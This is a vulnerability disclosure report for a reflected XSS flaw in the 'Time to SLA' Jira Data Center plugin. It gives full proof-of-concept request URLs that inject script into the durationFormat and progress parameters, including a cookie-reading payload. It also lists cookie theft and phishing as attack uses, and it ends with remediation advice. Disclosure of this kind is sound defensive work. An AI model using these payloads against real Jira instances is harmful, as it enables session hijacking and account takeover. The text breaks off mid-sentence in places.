Vulnerability submitted by Shuning Xu

Supplier:https://www.atlassian.com/software/jira

Software download link: https://www.atlassian.com/software/jira/update

Affected software :jira software

Vulnerability plugin name: Time to SLA

Vulnerability plugin Version: Version 10.13.5•Jira Data Center 8.0.0 - 9.10.1

Description :For jira software download, select HOSTING TYPES as the data center and download the latest version 9.10.1 locally. Install the latest version 10.13.5 of the Time to SLA plugin, which is applicable to Jira Data Center 8.0.0 - 9.10.1. The Time to SLA plugin has XSS Vulnerabilities, that is, cross-site scripting attacks, attackers will insert malicious JavaScript codes into web pages, and the payload is <ScRiPt>alert(1)</ScRiPt>, which will trigger when administrators/users access, so as to achieve the purpose of the attack. The essential reason is that the server does not strictly filter the data submitted by the user, causing the browser to treat the user's input as JS code and directly return it to the client for execution. What's happening here is reflected XSS. The attacker can steal the cookies of users such as administrators, steal clipboard content, change web page content (such as download links) and so on by using reflected cross-site scripting attacks.

Test process:
1. After installing the plugin Time to SLA, the paid plugin needs to obtain a license and activate the plugin.
Download address: the page

/plugins/servlet/upm/marketplace/featured? source=side_nav_find_new_addons 

Enter the plugin name Time to SLA download.

![image-xss1.1[Time to SLA]](images/xss1.1[Time to SLA].png)

Or download in the app store at 
https://marketplace.atlassian.com/apps/1211843/time-to-sla?tab=overview&hosting=datacenter

![image-xss1.2[Time to SLA]](images/xss1.2[Time to SLA].png)

2. Navigate to the URL:
http://localhost:port/secure/ConfigureReport.jspa?reportKey=plugin.tts%3Atts-sla-report&selectedProjectId=10000&issueFilter=JQL&jql-field=Assets+is+EMPTY+&filterid=&slaIds=&progress=EXCEED&durationFormat=dayHourMinute&additional-field=priority&additional-field=aggregatetimespent&additional-custom-field=10200&additional-custom-field=10203&additional-custom-field=10106&additional-sla-field=min&sla-field=startDate&sla-field=targetDate&sla-field=endDate&sla-field=elapsedPercentage&sla-field=workingDuration&sla-field=pausedDuration&originDateFrom=2023-08-23&originDateTo=2023-09-20&expectedTargetDateFrom=&expectedTargetDateTo=&actualTargetDateFrom=2023-08-08&actualTargetDateTo=&showDisabledSlas=true

![image-xss1.3[Time to SLA]](images/xss1.3[Time to SLA].png)

3. Launch Burp Suite to capture network traffic. Use Burpsuite to capture and change packets for detection:
![image-xss1.4[Time to SLA]](images/xss1.4[Time to SLA].png)

4. Change the durationFormat parameter to <ScRiPt>alert(1)</ScRiPt> and send the modified url.

/secure/ConfigureReport.jspa?reportKey=plugin.tts%3Atts-sla-report&selectedProjectId=10000&issueFilter=JQL&jql-field=Assets+is+EMPTY+&filterid=&slaIds=&progress=EXCEED&durationFormat=<ScRiPt>alert(1)</ScRiPt>&additional-field=priority&additional-field=aggregatetimespent&additional-custom-field=10200&additional-custom-field=10203&additional-custom-field=10106&additional-sla-field=min&sla-field=startDate&sla-field=targetDate&sla-field=endDate&sla-field=elapsedPercentage&sla-field=workingDuration&sla-field=pausedDuration&originDateFrom=2023-08-23&originDateTo=2023-09-20&expectedTargetDateFrom=&expectedTargetDateTo=&actualTargetDateFrom=2023-08-08&actualTargetDateTo=&showDisabledSlas=true

Or change the durationFormat parameter to <ScRiPt>alert(document.cookie)</ScRiPt> and send the modified url.

/secure/ConfigureReport.jspa?reportKey=plugin.tts%3Atts-sla-report&selectedProjectId=10000&issueFilter=JQL&jql-field=Assets+is+EMPTY+&filterid=&slaIds=&progress=EXCEED&durationFormat=<ScRiPt>alert(document.cookie)</ScRiPt>&additional-field=priority&additional-field=aggregatetimespent&additional-custom-field=10200&additional-custom-field=10203&additional-custom-field=10106&additional-sla-field=min&sla-field=startDate&sla-field=targetDate&sla-field=endDate&sla-field=elapsedPercentage&sla-field=workingDuration&sla-field=pausedDuration&originDateFrom=2023-08-23&originDateTo=2023-09-20&expectedTargetDateFrom=&expectedTargetDateTo=&actualTargetDateFrom=2023-08-08&actualTargetDateTo=&showDisabledSlas=true

Or Change the progress parameter to <ScRiPt>alert(2)</ScRiPt> and send the modified url.

/secure/ConfigureReport.jspa?reportKey=plugin.tts%3Atts-sla-report&selectedProjectId=10000&issueFilter=JQL&jql-field=Assets+is+EMPTY+&filterid=&slaIds=&progress=<ScRiPt>alert(2)</ScRiPt>&durationFormat=dayHourMinute&additional-field=priority&additional-field=aggregatetimespent&additional-custom-field=10200&additional-custom-field=10203&additional-custom-field=10106&additional-sla-field=min&sla-field=startDate&sla-field=targetDate&sla-field=endDate&sla-field=elapsedPercentage&sla-field=workingDuration&sla-field=pausedDuration&originDateFrom=2023-08-23&originDateTo=2023-09-20&expectedTargetDateFrom=&expectedTargetDateTo=&actualTargetDateFrom=2023-08-08&actualTargetDateTo=&showDisabledSlas=true

5. A pop-up window will appear on the web page, and an alarm box showing 1 will pop up, triggering XSS, indicating that there is cross-site vulnerability, recording the vulnerability, and stopping the test.

![image-xss1.5[Time to SLA]](images/xss1.5[Time to SLA].png)

![image-xss1.6[Time to SLA]](images/xss1.6[Time to SLA].png)

A pop-up warning box showing cookies

![image-xss1.7[Time to SLA]](images/xss1.7[Time to SLA].png)

A pop-up warni

Attack steps:

1.Attackers create and test malicious URLs;

2.The attacker is sure that the victim loaded a malicious URL in the browser;

3.The attacker uses reflected cross-site scripting attacks to install keyloggers, steal victims' cookies, steal clipboard content, and change web page content (such as download links).

Attack method:

1. Use xss testing platform BlueLotus to steal cookies

2.Malicious links

3. Web phishing

4.Redirection implanted advertisement

Risk level: reflected cross-site presence in the application

Repair solution: 

For XSS cross-site vulnerabilities, the following repair methods can be used:

Overall fix: Validate all input data to effectively detect attacks; properly encode all output data to prevent any successfully injected scripts from running on the browser side. details as follows :

Input Validation: Validate the length, type, syntax, and business rules of all input data using standard input validation mechanisms before a certain data is accepted for display or storage.

Output encoding: Before data output, ensure that the data submitted by the user has been correctly encoded by entity. It is recommended to encode all characters instead of being limited to a certain subset.

Explicitly specify the encoding of the output: don't allow an attacker to choose an encoding (such as ISO 8859-1 or UTF 8) for your users.

Pay attention to the limitations of the blacklist verification method: just find or replace some characters (such as "<" ">" or keywords like "script"), it is easy to bypass the verification mechanism by XSS variant attacks.

Beware of normalization errors: Before validating input, it must be decoded and normalized to conform to the application's current internal representation. Make sure the application does not decode the same input twice. To filter the data submitted by the client, it is generally recommended to filter out special characters such as double quotes ("), angle brackets (<, >), or perform entity conversion on the special characters contained in the data submitted by the client, such as double quotes (") into its entity form &quot;, <corresponding entity form is &lt;, <corresponding entity form is&gt; The following are common characters to be filtered:
